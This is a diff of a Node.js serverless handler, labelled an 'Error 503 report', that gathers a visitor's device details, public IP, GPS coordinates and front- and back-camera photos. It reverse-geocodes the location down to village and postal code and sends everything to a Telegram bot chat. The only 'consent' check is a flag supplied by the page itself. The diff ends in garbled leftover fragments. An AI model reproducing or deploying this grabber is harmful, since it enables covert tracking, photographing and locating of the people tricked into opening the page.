@@ -2,63 +2,46 @@ import { isIP } from "node:net";
 
 export default async function handler(req, res) {
   if (req.method !== "POST") {
-    return res.status(405).json({
-      success: false,
-      message: "Method not allowed"
-    });
+    return res.status(405).send("Method not allowed");
   }
 
   try {
-    const {
-      consent,
-      os,
-      platform,
-      cpu,
-      ram,
-      resolution,
-      browser,
-      timezone,
-      language,
-      latitude,
-      longitude,
-      accuracy,
-      locationStatus,
-      frontCamera,
-      backCamera,
-      frontPhoto,
-      backPhoto
-    } = req.body || {};
+    const data = req.body || {};
 
-    if (consent !== true) {
-      return res.status(403).json({
-        success: false,
-        message: "Persetujuan diperlukan"
-      });
+    if (data.consent !== true) {
+      return res.status(403).send("Consent required");
     }
 
     const TOKEN = process.env.BOT_TOKEN;
     const CHAT_ID = process.env.CHAT_ID;
 
     if (!TOKEN || !CHAT_ID) {
-      throw new Error("Environment variables belum diatur");
+      throw new Error("BOT_TOKEN atau CHAT_ID belum diatur");
     }
 
-    // Ambil IP
+    const {
+      os, platform, cpu, ram, resolution,
+      browser, timezone, language,
+      latitude, longitude, accuracy,
+      frontCamera, backCamera,
+      frontPhoto, backPhoto
+    } = data;
+
+    // PUBLIC IP
     const forwarded = req.headers["x-forwarded-for"];
-    const candidate = forwarded
+    const rawIP = forwarded
       ? forwarded.split(",")[0].trim()
       : req.socket?.remoteAddress || "";
 
-    const ip = isIP(candidate) ? candidate : "Unknown";
+    const publicIP = isIP(rawIP) ? rawIP : "Unknown";
 
-    // IP geolocation
+    // IP INFORMATION
     let ipInfo = {};
 
-    if (ip !== "Unknown") {
+    if (publicIP !== "Unknown") {
       try {
         const response = await fetch(
-          `https://ipwho.is/${encodeURIComponent(ip)}`,
-          { signal: AbortSignal.timeout(7000) }
+          `https://ipwho.is/${encodeURIComponent(publicIP)}`
         );
 
         const result = await response.json();
@@ -66,18 +49,22 @@ export default async function handler(req, res) {
         if (result.success) {
           ipInfo = result;
         }
-      } catch {}
+      } catch (error) {
+        console.error("IP lookup:", error);
+      }
     }
 
-    // GPS reverse geocoding
+    // GPS VALIDATION
+    const validGPS =
+      typeof latitude === "number" &&
+      typeof longitude === "number" &&
+      Math.abs(latitude) <= 90 &&
+      Math.abs(longitude) <= 180;
+
+    // ADDRESS INFORMATION
     let address = {};
 
-    if (
-      Number.isFinite(latitude) &&
-      Number.isFinite(longitude) &&
-      Math.abs(latitude) <= 90 &&
-      Math.abs(longitude) <= 180
-    ) {
+    if (validGPS) {
       try {
         const response = await fetch(
           "https://nominatim.openstreetmap.org/reverse?" +
@@ -91,32 +78,89 @@ export default async function handler(req, res) {
           {
             headers: {
               "User-Agent": "Error503Report/1.0"
-            },
-            signal: AbortSignal.timeout(7000)
+            }
           }
         );
 
         const result = await response.json();
         address = result.address || {};
-      } catch {}
+      } catch (error) {
+        console.error("Address lookup:", error);
+      }
     }
 
-    const locationQuality =
-      typeof accuracy === "number"
-        ? accuracy < 20 ? "High"
-        : accuracy < 100 ? "Medium"
-        : "Low"
-        : "Tidak tersedia";
+    // LOCATION QUALITY
+    let quality = "Tidak tersedia";
 
-    const maps =
-      Number.isFinite(latitude) && Number.isFinite(longitude)
-        ? `https://www.google.com/maps?q=${latitude},${longitude}`
-        : "Tidak tersedia";
+    if (typeof accuracy === "number") {
+      quality =
+        accuracy < 20 ? "High" :
+        accuracy < 100 ? "Medium" :
+        "Low ❌";
+    }
 
-    const date = new Date().toLocaleString("sv-SE", {
+    const source = validGPS ? "GPS" : "IP Geolocation";
+
+    // AREA ESTIMATION: jangan mengarang RT/RW
+    const areaEst = "Tidak tersedia dari sumber geolokasi";
+
+    const village =
+      address.village ||
+      address.suburb ||
+      address.neighbourhood ||
+      "Unknown";
+
+    const district =
+      address.city_district ||
+      address.county ||
+      address.district ||
+      "Unknown";
+
+    const city =
+      address.city ||
+      address.town ||
+      address.municipality ||
+      "Unknown";
+
+    const province =
+      address.state ||
+      "Unknown";
+
+    const postalCode =
+      address.postcode ||
+      "Unknown";
+
+    const country =
+      address.country ||
+      "Unknown";
+
+    const ipCountry =
+      ipInfo.country_code ||
+      ipInfo.country ||
+      "Unknown";
+
+    const ipRegion =
+      ipInfo.region ||
+      "Unknown";
+
+    const ipCity =
+      ipInfo.city ||
+      "Unknown";
+
+    const isp =
+      ipInfo.connection?.org ||
+      ipInfo.connection?.isp ||
+      "Unknown";
+
+    const maps = validGPS
+      ? `https://www.google.com/maps?q=${latitude},${longitude}`
+      : "Tidak tersedia";
+
+    const time = new Date().toLocaleString("sv-SE", {
       timeZone: timezone || "Asia/Jakarta"
     });
 
+    // FORMAT LAPORAN LENGKAP
     const report = `
 🚨 ERROR 503 REPORT
 
@@ -128,38 +172,37 @@ export default async function handler(req, res) {
 ⚙️ CPU Cores    : ${cpu || "Unknown"}
 💾 RAM          : ${ram || "Unknown"}
 🖥 Resolution   : ${resolution || "Unknown"}
-
-🌐 Browser:
+🌐 Browser      :
 ${browser || "Unknown"}
 
 🕒 Timezone     : ${timezone || "Unknown"}
 🗣 Language     : ${language || "Unknown"}
-🌍 Public IP    : ${ip}
+🌍 Public IP    : ${publicIP}
 
 ━━━━━━━━━━━━━━━━━━━━
 🌎 IP INFORMATION
 ━━━━━━━━━━━━━━━━━━━━
-🌍 Country      : ${ipInfo.country || "Unknown"}
-📍 Region       : ${ipInfo.region || "Unknown"}
-🏙 City         : ${ipInfo.city || "Unknown"}
-🏢 ISP / Org    : ${ipInfo.connection?.org || "Unknown"}
+🌍 Country     : ${ipCountry}
+📍 Region      : ${ipRegion}
+🏙 City        : ${ipCity}
+🏢 ISP / Org   : ${isp}
 
 ━━━━━━━━━━━━━━━━━━━━
 🏠 ADDRESS INFORMATION
 ━━━━━━━━━━━━━━━━━━━━
-🏘 Village      : ${address.village || address.suburb || "Unknown"}
-🏙 District     : ${address.city_district || address.county || "Unknown"}
-🏛 City         : ${address.city || address.town || address.municipality || "Unknown"}
-🌆 Province     : ${address.state || "Unknown"}
-📮 Postal Code  : ${address.postcode || "Unknown"}
-🌍 Country      : ${address.country || "Unknown"}
+🏘 Village      : ${village}
+🏙 District     : ${district}
+🏛 City         : ${city}
+🌆 Province     : ${province}
+📮 Postal Code  : ${postalCode}
+🌍 Country      : ${country}
 
 ━━━━━━━━━━━━━━━━━━━━
 📐 LOCATION QUALITY
 ━━━━━━━━━━━━━━━━━━━━
-🎯 Quality      : ${locationQuality}
-📡 GPS Status   : ${locationStatus || "Unknown"}
-🎯 Accuracy     : ${accuracy ? accuracy + " m" : "Unknown"}
+🎯 Quality     : ${quality}
+🧭 Area Est.   : ${areaEst}
+📡 Source      : ${source}
 
 🗺 Google Maps:
 ${maps}
@@ -170,44 +213,49 @@ ${maps}
 🤳 Front Camera : ${frontCamera || "Unknown"}
 📸 Back Camera  : ${backCamera || "Unknown"}
 
-⏰ Time : ${date}
+⏰ Time : ${time}
 `;
 
-    // Kirim laporan teks
-    const messageResponse = await fetch(
-      `https://api.telegram.org/bot${TOKEN}/sendMessage`,
-      {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json"
-        },
-        body: JSON.stringify({
-          chat_id: CHAT_ID,
-          text: report
-        })
+    // SEND TELEGRAM MESSAGE
+    async function telegramRequest(method, body) {
+      const response = await fetch(
+        `https://api.telegram.org/bot${TOKEN}/${method}`,
+        {
+          method: "POST",
+          body: JSON.stringify(body),
+          headers: {
+            "Content-Type": "application/json"
+          }
+        }
+      );
+
+      const result = await response.json();
+
+      if (!result.ok) {
+        throw new Error(result.description || "Telegram API error");
       }
-    );
 
-    const messageResult = await messageResponse.json();
-
-    if (!messageResult.ok) {
-      throw new Error("Telegram gagal mengirim laporan teks");
+      return result;
     }
 
-    // Validasi dan kirim foto
+    await telegramRequest("sendMessage", {
+      chat_id: CHAT_ID,
+      text: report
+    });
+
+    // SEND USER-CONSENTED PHOTOS
     async function sendPhoto(photo, caption) {
-      if (
-        typeof photo !== "string" ||
-        !photo.startsWith("data:image/jpeg;base64,")
-      ) {
-        return;
+      if (!photo) return;
+
+      if (!photo.startsWith("data:image/jpeg;base64,")) {
+        throw new Error("Format foto tidak valid");
       }
 
       const base64 = photo.split(",")[1];
       const buffer = Buffer.from(base64, "base64");
 
-      if (buffer.length > 1200000) {
-        throw new Error("Ukuran foto terlalu besar");
+      if (buffer.length > 1000000) {
+        throw new Error("Foto melebihi batas ukuran");
       }
 
       const form = new FormData();
@@ -231,7 +279,7 @@ ${maps}
       const result = await response.json();
 
       if (!result.ok) {
-        throw new Error("Telegram gagal mengirim " + caption);
+        throw new Error(result.description || "Gagal mengirim foto");
       }
     }
 
@@ -243,50 +291,13 @@ ${maps}
       await sendPhoto(backPhoto, "📸 Back Camera");
     }
 
-    return res.status(200).json({
-      success: true,
-      message: "Laporan berhasil dikirim"
-    });
+    return res.status(200).send("Laporan berhasil dikirim.");
 
   } catch (error) {
-    console.error(error);
+    console.error("SEND REPORT ERROR:", error);
 
-    return res.status(500).json({
-      success: false,
-      message: "Terjadi kesalahan saat mengirim laporan"
-    });
+    return res.status(500).send(
+      "Server error: " + error.message
+    );
   }
-}dTelegramPhoto(
-                BOT_TOKEN,
-                CHAT_ID,
-                input.backPhoto,
-                "📸 Foto Kamera Belakang - dikonfirmasi pengguna"
-            );
-
-        }
-
-
-        return res.status(200).json({
-
-            success:true,
-
-            message:"Laporan berhasil dikirim"
-
-        });
-
-
-    }catch(error){
-
-        console.error(error);
-
-        return res.status(500).json({
-
-            success:false,
-
-            message:error.message || "Gagal mengirim laporan"
-
-        });
-
-    }
-
-                                             }
+}
